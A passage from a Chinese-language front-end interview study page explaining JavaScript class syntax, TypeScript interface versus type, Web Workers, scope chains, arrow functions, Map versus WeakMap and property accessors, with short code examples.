class="headerlink" title="33、class关键字实现的原理"></a>33、class关键字实现的原理</h3><p><code>class</code> 关键字是 JavaScript ES6 引入的一种用于创建对象的语法糖，它更符合传统的面向对象编程的风格。在 JavaScript 中，对象是通过构造函数和原型链创建的，而 <code>class</code> 关键字使得创建对象更加简洁和易读。</p><p><code>class</code> 关键字的实现原理基本上仍然是基于原型继承的，它隐藏了一些底层细节，使得开发者能够更方便地创建和继承类。下面是 <code>class</code> 关键字的主要实现原理：</p><ol><li><p><strong>创建构造函数</strong>：</p><p>当你使用 <code>class</code> 关键字定义一个类时，实际上创建了一个构造函数。这个构造函数的名称与类名相同，它用于初始化对象的属性和方法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  &#125;<br><br>  <span class="hljs-title function_">sayHello</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hello, my name is <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>`</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>上述代码中的 <code>Person</code> 类创建了一个构造函数，该构造函数接受一个参数 <code>name</code> 并初始化 <code>name</code> 属性。</p></li><li><p><strong>原型链继承</strong>：</p><p>在 <code>class</code> 关键字中定义的方法（如 <code>sayHello</code>）会被添加到类的原型对象上，从而可以被类的实例继承。实际上，每个类都有一个原型对象，它包含了类的方法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHello</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hello, my name is <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>`</span>);<br>&#125;;<br></code></pre></td></tr></table></figure><p>上述代码中，<code>sayHello</code> 方法被添加到 <code>Person</code> 类的原型对象上。</p></li><li><p><strong>创建实例</strong>：</p><p>使用 <code>new</code> 关键字可以创建类的实例，这会调用类的构造函数来初始化实例属性。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> person = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;Alice&quot;</span>);<br></code></pre></td></tr></table></figure></li><li><p><strong>继承</strong>：</p><p>使用 <code>extends</code> 关键字可以创建类的继承关系，子类会继承父类的属性和方法。在子类的构造函数中，必须首先调用 <code>super()</code> 方法来调用父类的构造函数。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Person</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name, studentId</span>) &#123;<br>    <span class="hljs-variable language_">super</span>(name);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">studentId</span> = studentId;<br>  &#125;<br><br>  <span class="hljs-title function_">study</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span> is studying.`</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>上述代码中，<code>Student</code> 类继承了 <code>Person</code> 类，并在构造函数中调用了 <code>super(name)</code> 来初始化父类的属性。</p></li></ol><p>总之，<code>class</code> 关键字是一种更加友好和直观的语法，它隐藏了 JavaScript 中原型继承的细节，使得对象的创建和继承更容易理解和使用。然而，它的底层实现仍然依赖于原型链继承，因此理解原型链的工作方式对于深入了解 <code>class</code> 关键字的原理非常有帮助。</p><h3 id="34、interface-type比较"><a href="#34、interface-type比较" class="headerlink" title="34、interface type比较"></a>34、interface type比较</h3><p>在 TypeScript 中，<code>interface</code> 和 <code>type</code> 是用来定义对象的类型或自定义类型的两种主要方式。它们有一些相似之处，但也有一些区别，下面是它们的比较：</p><h5 id="1-接口（interface）："><a href="#1-接口（interface）：" class="headerlink" title="1. 接口（interface）："></a>1. 接口（<code>interface</code>）：</h5><ul><li><p><strong>使用场景</strong>：</p><ul><li>接口通常用于描述对象的形状（属性和方法）。</li><li>接口可以被类实现，用于定义类的结构。</li><li>当你需要定义一个新的自定义类型时，接口是一个常见的选择。</li></ul></li><li><p><strong>声明方式</strong>：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Person</span> &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;<br>  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>扩展性</strong>：</p><ul><li>接口可以使用 <code>extends</code> 关键字来扩展其他接口。</li></ul><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Animal</span> &#123;<br>  <span class="hljs-attr">species</span>: <span class="hljs-built_in">string</span>;<br>&#125;<br><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Animal</span> &#123;<br>  <span class="hljs-title function_">bark</span>(): <span class="hljs-built_in">void</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h5 id="2-类型别名（type）："><a href="#2-类型别名（type）：" class="headerlink" title="2. 类型别名（type）："></a>2. 类型别名（<code>type</code>）：</h5><ul><li><p><strong>使用场景</strong>：</p><ul><li>类型别名通常用于给现有类型取一个别名。</li><li>可以用于联合类型、交叉类型等复杂类型的定义。</li><li>用于定义函数签名类型。</li></ul></li><li><p><strong>声明方式</strong>：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Person</span> = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;<br>  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p><strong>扩展性</strong>：</p><ul><li>类型别名可以使用 <code>&amp;</code> 运算符进行类型交叉（Intersection Types）。</li></ul><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Point</span> = &#123; <span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>; <span class="hljs-attr">y</span>: <span class="hljs-built_in">number</span> &#125;;<br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Color</span> = &#123; <span class="hljs-attr">color</span>: <span class="hljs-built_in">string</span> &#125;;<br><span class="hljs-keyword">type</span> <span class="hljs-title class_">ColoredPoint</span> = <span class="hljs-title class_">Point</span> &amp; <span class="hljs-title class_">Color</span>;<br></code></pre></td></tr></table></figure><ul><li>类型别名也可以使用联合类型。</li></ul><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Result</span> = <span class="hljs-title class_">Success</span> | <span class="hljs-title class_">Error</span>;<br></code></pre></td></tr></table></figure></li></ul><h5 id="3-区别："><a href="#3-区别：" class="headerlink" title="3. 区别："></a>3. 区别：</h5><ul><li><p><strong>可重复声明</strong>：</p><ul><li>接口可以被多次声明，会自动合并相同名称的接口。而类型别名不能重复声明。</li></ul></li><li><p><strong>可拓展性</strong>：</p><ul><li>类型别名具有更丰富的类型操作符，如联合类型（<code>|</code>）、交叉类型（<code>&amp;</code>）等，更适合复杂类型定义。</li><li>接口可以使用 <code>extends</code> 来扩展其他接口，但无法进行类型操作。</li></ul></li><li><p><strong>适用场景</strong>：</p><ul><li>如果你需要定义一个新的自定义类型，通常使用接口更为直观。</li><li>如果你需要处理复杂类型，如联合类型或交叉类型，或者需要为函数签名定义类型别名，那么类型别名更为适合。</li></ul></li></ul><p>总的来说，<code>interface</code> 主要用于定义对象的形状和类的结构，而 <code>type</code> 别名更适合用于创建复杂类型、联合类型、交叉类型以及函数签名类型的别名。在实际应用中，你可以根据具体需求选择使用哪种方式，它们在 TypeScript 中可以互补使用。</p><p>这是一个微妙的话题，不要太纠结。这是一个方便的表格：</p><table><thead><tr><th>方面</th><th>Type</th><th>Interface</th></tr></thead><tbody><tr><td>可以描述功能</td><td>✅</td><td>✅</td></tr><tr><td>可以描述构造函数</td><td>✅</td><td>✅</td></tr><tr><td>可以描述元组</td><td>✅</td><td>✅</td></tr><tr><td>接口可以扩展它</td><td>⚠️</td><td>✅</td></tr><tr><td>类可以扩展它</td><td>🚫</td><td>✅</td></tr><tr><td>类可以实现它（<code>implements</code>）</td><td>⚠️</td><td>✅</td></tr><tr><td>可以与另一同类相交</td><td>✅</td><td>⚠️</td></tr><tr><td>可以与另一个同类建立联盟</td><td>✅</td><td>🚫</td></tr><tr><td>可用于创建映射类型</td><td>✅</td><td>🚫</td></tr><tr><td>可以使用映射类型进行映射</td><td>✅</td><td>✅</td></tr><tr><td>在错误消息和日志中扩展</td><td>✅</td><td>🚫</td></tr><tr><td>可以增强</td><td>🚫</td><td>✅</td></tr><tr><td>可以递归</td><td>⚠️</td><td>✅</td></tr></tbody></table><ol><li>定义基本类型别名</li></ol><p><code>type</code>可以定义<strong>基本类型别名</strong>, 但是<code>interface</code>无法定义,如：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini">type <span class="hljs-attr">userName</span> = string<br>type <span class="hljs-attr">stuNo</span> = number<br>...<br></code></pre></td></tr></table></figure><ol start="2"><li>声明联合类型</li></ol><p><code>type</code>可以声明<strong>联合类型</strong>, 例如：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini">type <span class="hljs-attr">Student</span> = &#123;stu<span class="hljs-literal">No</span>: number&#125; | &#123;classId: number&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li>声明元组</li></ol><p>type可以声明 <strong>元组类型</strong>：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini">type <span class="hljs-attr">Data</span> = [number, string]<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>以上都是 <code>type</code>能做到， 而<code>interface</code>做不到的， 接下来聊聊<code>type</code>做不到的</p><ol start="4"><li>声明合并</li></ol><p>如果你多次声明一个同名的接口，TypeScript 会将它们合并到一个声明中，并将它们视为一个接口。这称为<strong>声明合并</strong>， 例如：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Person</span> &#123; <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span> &#125;<br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Person</span> &#123; <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span> &#125;<br><br><span class="hljs-keyword">let</span> <span class="hljs-attr">user</span>: <span class="hljs-title class_">Person</span> = &#123;<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;Tolu&quot;</span>,<br>    <span class="hljs-attr">age</span>: <span class="hljs-number">0</span>,<br>&#125;;<br></code></pre></td></tr></table></figure><p>这种情况下，如果是<code>type</code>的话，重复使用<code>Person</code>是会报错的：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Person</span> &#123; <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span> &#125;; <br><br><span class="hljs-comment">// Error: 标识符“Person”重复。ts(2300)</span><br><span class="hljs-keyword">type</span> <span class="hljs-title class_">Person</span> &#123; <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span> &#125;<br></code></pre></td></tr></table></figure><ol start="5"><li>索引签名问题</li></ol><p>如果你经常使用TypeScript, 一定遇到过相似的错误：</p><blockquote><p>Type ‘xxx’ is not assignable to type ‘yyy’</p><p>Index signature is missing in type ‘xxx’.</p></blockquote><p>看个例子来理解问题：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs ini">interface propType&#123;<br>    <span class="hljs-section">[key: string]</span> : string<br>&#125;<br><br>let props: propType<br><br>type <span class="hljs-attr">dataType</span> = &#123;<br>    title: string<br>&#125;<br>interface dataType1 &#123;<br>    title: string<br>&#125;<br>const data: <span class="hljs-attr">dataType</span> = &#123;title: <span class="hljs-string">&quot;订单页面&quot;</span>&#125;<br>const data1: <span class="hljs-attr">dataType1</span> = &#123;title: <span class="hljs-string">&quot;订单页面&quot;</span>&#125;<br><span class="hljs-attr">props</span> = data<br>// Error:类型“dataType1”不可分配给类型“propType”<span class="hljs-comment">; 类型“dataType1”中缺少索引签名 </span><br><span class="hljs-attr">props</span> = data1<br></code></pre></td></tr></table></figure><p>我们发现<code>dataType</code>和<code>dataType1</code>对应的类型一样，但是<code>interface</code>定义的就赋值失败，是什么原因呢？刚开始百思不解，最后我在 stack overflow上找到了一个相似的问题：</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/465347e9c2254ea1a103ffbf796e3c5d~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp" alt="图片"></p><p>并且很幸运的找到了有效的答案：</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/56495f49fe98479fa0392a5d8bd19518~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp" alt="图片"></p><p>翻译过来的大致意思就是：</p><blockquote><p><code>Record&lt;string,string&gt;</code>与<code>&#123;[key:string]：string&#125;</code>相同。只有当该类型的所有属性都已知并且可以对照该索引签名进行检查时，才允许将子集分配给该索引签名类型。在您的例子中，从<code>exampleType</code>到<code>Record&lt;string,string&gt;</code>的所有内容都是可分配的。这只能针对对象字面量类型进行检查，因为一旦声明了对象字面量类型，就无法更改它们。因此，索引签名是已知的。</p><p>相反，<strong>在你使用interface去声明变量时，它们在那一刻类型并不是最终的类型</strong>。由于interfac可以进行<strong>声明合并</strong>，所以总有可能将新成员添加到同一个interface定义的类型上。</p></blockquote><p>再结合👆<code>第4点 声明合并</code>的讲解, 这样就很好理解了。就是说<code>interface</code>定义的类型是不确定的， 后面再来一个：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">propType</span>&#123;<br>    title:number<br>&#125;<br></code></pre></td></tr></table></figure><p>这样<code>propType</code>类型就被改变了。</p><h3 id="35、谈谈你对Web-Workers的理解"><a href="#35、谈谈你对Web-Workers的理解" class="headerlink" title="35、谈谈你对Web Workers的理解"></a>35、谈谈你对Web Workers的理解</h3><p>Web Workers 在浏览器中提供了一个单独的、并行的执行环境，可以运行长时间运行的脚本而不会阻塞 UI 线程。然而，这个执行环境与主 JavaScript 执行环境相比有一些限制。以下是主要的一些限制：</p><ol><li>无法访问 DOM：Web Workers 运行在隔离的线程中，不能直接访问网页的 DOM。任何与 UI 相关的操作都需要通过主线程完成。</li><li>无法访问全局对象：Web Workers 不能访问许多全局对象，如 <code>window</code> 对象，因为这些对象与 UI 相关或者包含与 UI 相关的功能。</li><li>无法访问某些 Web API：像 navigator.geolocation 或者 window.localStorage 这样的 Web API 无法在 Web Workers 中使用。</li><li>无法加载其他脚本：Web Workers 无法使用 <code>&lt;script&gt;</code> 标签加载其他脚本。但是，可以使用 <code>importScripts()</code> 函数来导入其他脚本。</li><li>数据传递限制：Web Workers 通过消息传递与主线程通信。这意味着所有的数据在传送时都需要被序列化和反序列化，这可能会对性能产生影响。</li><li>运行环境的限制：Web Workers 运行在不同的全局上下文中，即 <code>DedicatedWorkerGlobalScope</code>，而不是主线程的 <code>window</code>。因此，一些预期在 <code>window</code> 上下文中使用的代码在 Web Worker 中可能无法正常工作。</li></ol><p>总的来说，Web Workers 是设计用于执行计算密集型或者长时间运行的任务，而非操作 UI 或者处理与 UI 相关的逻辑。对于需要与 UI 交互的操作，仍然需要在主线程中完成。</p><h3 id="36、如何理解作用域、作用域链和执行上下文？"><a href="#36、如何理解作用域、作用域链和执行上下文？" class="headerlink" title="36、如何理解作用域、作用域链和执行上下文？"></a>36、如何理解作用域、作用域链和执行上下文？</h3><p>在JavaScript中，作用域、作用域链和执行上下文是密切相关的概念，它们与变量和函数的查找、访问以及生命周期有关。</p><ol><li><p>作用域（Scope）：</p><p><strong>作用域是一个变量或函数的可访问范围</strong>。JavaScript中有三种作用域：<strong>全局作用域</strong>、<strong>局部（函数）作用域</strong>和<strong>块级作用域</strong>。全局作用域中声明的变量和函数可以在整个代码中访问，局部作用域中声明的变量和函数只能在特定的函数内部访问，块级作用域在一对花括号内定义，对<code>let</code>和<code>const</code>关键字声明的变量有效。</p><p>变量的生命周期受其作用域的限制。全局作用域中的变量在整个程序执行过程中持续存在，局部作用域中的变量在函数执行结束时销毁，块级作用域在代码块执行结束时，块级作用域中的变量将被销毁。</p></li><li><p>作用域链（Scope Chain）：</p><p><strong>当代码执行过程中访问一个变量或函数时，JavaScript引擎会沿着作用域链查找该标识符</strong>。作用域链是由当前执行上下文的作用域和其所有父级作用域组成的链表。</p><p>查找过程从当前作用域开始，然后逐级向上查找，直到找到目标标识符或到达全局作用域。如果在全局作用域中仍未找到目标标识符，则返回<code>undefined</code>。</p></li><li><p>执行上下文（Execution Context）：</p><p><strong>执行上下文是JavaScript代码执行过程中的环境</strong>。每当进入一个新的函数执行或全局代码执行时，都会创建一个新的执行上下文。执行上下文包含了当前执行的代码所需的所有信息，如变量、函数、作用域链等。</p><p>JavaScript引擎使用执行上下文栈（Execution Context Stack）来管理执行上下文。栈顶的执行上下文为当前执行的代码环境。当一个函数被调用时，一个新的执行上下文被压入栈顶；当函数执行结束时，执行上下文从栈顶弹出，返回到调用者的上下文环境。</p></li></ol><p>总结起来，作用域是变量和函数的可访问范围；作用域链是由当前执行上下文的作用域和其父级作用域组成的链表，用于在代码执行过程中查找变量和函数；执行上下文是代码执行过程中的环境，包含了当前执行的代码所需的所有信息。这三者共同决定了代码执行过程中变量和函数的查找、访问以及生命周期。</p><h3 id="37、箭头函数与普通函数区别？"><a href="#37、箭头函数与普通函数区别？" class="headerlink" title="37、箭头函数与普通函数区别？"></a>37、箭头函数与普通函数区别？</h3><p>箭头函数（Arrow Functions）与普通函数（常被称为函数声明或函数表达式）在 JavaScript 中有一些重要的区别。这些区别包括语法、<code>this</code> 关键字的绑定、arguments 对象的使用、构造函数行为以及原型链。以下是箭头函数和普通函数之间的主要区别：</p><ol><li><p>this</p><p>关键字绑定：</p><ul><li>箭头函数没有自己的 <code>this</code>，它从包围它的普通函数或全局作用域继承 <code>this</code>。这使得在事件处理器或回调函数中使用箭头函数非常方便，因为它们自动捕获外部的 <code>this</code>。</li><li>普通函数有自己的 <code>this</code>，它的值在函数调用时确定。根据函数调用的方式（如通过对象方法调用、直接调用、构造函数调用等），<code>this</code> 的值可能会有所不同。</li></ul></li><li><p>arguments 对象：</p><ul><li>箭头函数没有自己的 <code>arguments</code> 对象。它们可以访问包围它们的普通函数的 <code>arguments</code> 对象。</li><li>普通函数有自己的 <code>arguments</code> 对象，这是一个类数组对象，包含了传递给函数的参数。</li></ul></li><li><p>构造函数行为：</p><ul><li>箭头函数不能作为构造函数使用，因此不能使用 <code>new</code> 关键字调用。它们也没有 <code>prototype</code> 属性。</li><li>普通函数可以作为构造函数使用，通过 <code>new</code> 关键字创建新的对象实例。</li></ul></li><li><p>原型链：</p><ul><li>由于箭头函数没有 <code>prototype</code> 属性，它们不能作为其他对象的原型。</li><li>普通函数有 <code>prototype</code> 属性，可以作为其他对象的原型。</li></ul></li><li><p>生成器：</p><ul><li>箭头函数不能使用<code>yield</code>关键字。</li><li>普通函数可以使用<code>yield</code>关键字变成生成器函数。</li></ul></li></ol><h3 id="38、Map和WeekMap"><a href="#38、Map和WeekMap" class="headerlink" title="38、Map和WeekMap"></a>38、Map和WeekMap</h3><p><code>Map</code> 和 <code>WeakMap</code> 都是 JavaScript 中用于存储键值对的数据结构，它们之间有一些重要的区别，主要体现在键的强引用和垃圾回收方面：</p><ol><li><p><strong>Map（强引用映射）：</strong></p><ul><li><code>Map</code> 是一个通用的键值对集合，可以使用各种数据类型作为键（包括对象、字符串、数字等）。</li><li><code>Map</code> 中的键是强引用的，这意味着只要存在对键的引用，键不会被垃圾回收。这可以确保在 <code>Map</code> 中存储的数据不会被不必要地销毁。</li><li><code>Map</code> 是可迭代的，可以使用 <code>for...of</code> 循环遍历其中的键值对。</li><li><code>Map</code> 具有各种方法，用于添加、获取、删除和检查键值对，例如 <code>set(key, value)</code>、<code>get(key)</code>、<code>delete(key)</code>、<code>has(key)</code> 等。</li></ul></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> myMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();<br><span class="hljs-keyword">const</span> key = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;John&#x27;</span> &#125;;<br>myMap.<span class="hljs-title function_">set</span>(key, <span class="hljs-string">&#x27;some value&#x27;</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myMap.<span class="hljs-title function_">get</span>(key)); <span class="hljs-comment">// &#x27;some value&#x27;</span><br></code></pre></td></tr></table></figure><ol start="2"><li><p><strong>WeakMap（弱引用映射）：</strong></p><ul><li><code>WeakMap</code> 也是一个键值对集合，但它的键是弱引用的，这意味着当没有对键的强引用时，键会被垃圾回收，这可以防止内存泄漏。</li><li><code>WeakMap</code> 的键必须是对象，不能是原始数据类型（如字符串、数字等）。</li><li><code>WeakMap</code> 不具备迭代能力，因此无法像 <code>Map</code> 那样直接遍历所有键值对。</li><li><code>WeakMap</code> 拥有的方法有限，主要包括 <code>set(key, value)</code>、<code>get(key)</code>、<code>delete(key)</code> 和 <code>has(key)</code>。</li></ul></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> myWeakMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>();<br><span class="hljs-keyword">const</span> key = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;John&#x27;</span> &#125;;<br>myWeakMap.<span class="hljs-title function_">set</span>(key, <span class="hljs-string">&#x27;some value&#x27;</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myWeakMap.<span class="hljs-title function_">get</span>(key)); <span class="hljs-comment">// &#x27;some value&#x27;</span><br></code></pre></td></tr></table></figure><p>要选择使用 <code>Map</code> 还是 <code>WeakMap</code> 取决于你的需求。如果需要强引用的键，或者需要能够迭代和访问所有键值对，那么使用 <code>Map</code> 是合适的。如果你希望键是弱引用的，以避免内存泄漏，那么可以考虑使用 <code>WeakMap</code>。一般来说，<code>WeakMap</code> 主要用于实现私有属性或缓存等场景，而 <code>Map</code> 则更常用于通用的键值对存储。</p><h3 id="39、对象属性的get和set是什么"><a href="#39、对象属性的get和set是什么" class="headerlink" title="39、对象属性的get和set是什么"></a>39、对象属性的get和set是什么</h3><p>在 JavaScript 中，对象属性的 <code>get</code> 和 <code>set</code> 是用于定义和访问属性的特殊方法，它们允许你在获取和设置属性值时执行自定义的逻辑。这是 ECMAScript 5 引入的特性，被称为 “属性访问器” 或 “存取器”。它们通常用于控制属性的读取和写入行为，以便在读取或设置属性值时执行一些额外的操作。</p><ol><li><p><strong><code>get</code> 方法：</strong> 用于定义属性的获取行为。当你尝试访问属性值时，<code>get</code> 方法会被调用，允许你返回一个自定义的值。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> obj = &#123;<br>  <span class="hljs-attr">_value</span>: <span class="hljs-number">0</span>,<br>  <span class="hljs-keyword">get</span> <span class="hljs-title function_">value</span>() &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Getting value&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">_value</span>;<br>  &#125;<br>&#125;;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">value</span>); <span class="hljs-comment">// 调用 get 方法，输出 &quot;Getting value&quot;，然后返回 0</span><br></code></pre></td></tr></table></figure></li><li><p><strong><code>set</code> 方法：</strong> 用于定义属性的设置行为。当你尝试设置属性值时，<code>set</code> 方法会被调用，允许你执行一些额外的逻辑，例如验证输入值。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> obj = &#123;<br>  <span class="hljs-attr">_value</span>: <span class="hljs-number">0</span>,<br>  <span class="hljs-keyword">set</span> <span class="hljs-title function_">value</span>(<span class="hljs-params">newValue</span>) &#123;<br>    <span class="hljs-keyword">if</span> (newValue &gt;= <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Setting value to&quot;</span>, newValue);<br>      <span class="hljs-variable language_">this</span>.<span class="hljs-property">_value</span> = newValue;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Invalid value&quot;</span>);<br>    &#125;<br>  &#125;<br>&#125;;<br><br>obj.<span class="hljs-property">value</span> = <span class="hljs-number">42</span>; <span class="hljs-comment">// 调用 set 方法，设置 _value 为 42</span><br>obj.<span class="hljs-property">value</span> = -<span class="hljs-number">5</span>; <span class="hljs-comment">// 调用 set 方法，但输出 &quot;Invalid value&quot;，不设置 _value</span><br></code></pre></td></tr></table></figure></li></ol><p>上述示例中的 <code>_value</code> 属性是一个内部属性，而 <code>value</code> 属性是一个存取器属性，它通过 <code>get</code> 和 <code>set</code> 方法来控制对 <code>_value</code> 的访问和修改。</p><p>使用 <code>get</code> 和 <code>set</code> 方法可以在对象属性上添加更多的逻辑和控制，以满足特定需求，例如数据验证、计算属性等。这种技术在类和对象的封装中也很有用。请注意，存取器属性的名称通常以一个下划线 <code>_</code> 开头，以表示它是一个内部属性，而不是直接访问的属性。</p><h3 id="40、proxy的使用"><a href="#40、proxy的使用" 